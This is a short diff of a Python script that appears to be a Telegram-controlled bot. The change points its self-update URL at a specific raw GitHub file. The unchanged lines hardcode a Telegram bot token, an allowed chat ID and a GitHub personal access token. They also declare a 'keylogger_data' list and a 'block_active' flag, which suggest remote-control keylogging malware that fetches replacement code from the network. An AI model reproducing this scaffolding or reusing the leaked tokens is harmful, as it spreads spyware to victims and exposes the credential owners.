@@ -14,7 +14,7 @@ from datetime import datetime
 TELEGRAM_BOT_TOKEN = "8816970870:AAHI120_toOTM0S5UgOXtNRFyHn9v0rqkxI"
 ALLOWED_CHAT_ID = "7666107995"
 GITHUB_PAT = "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"
-UPDATE_URL = "https://raw.githubusercontent.com/username/repo/main/tg_menu_bot.py"
+UPDATE_URL = "https://raw.githubusercontent.com/hazee2308/bot/main/bot.py"
 
 block_active = False
 keylogger_data = []
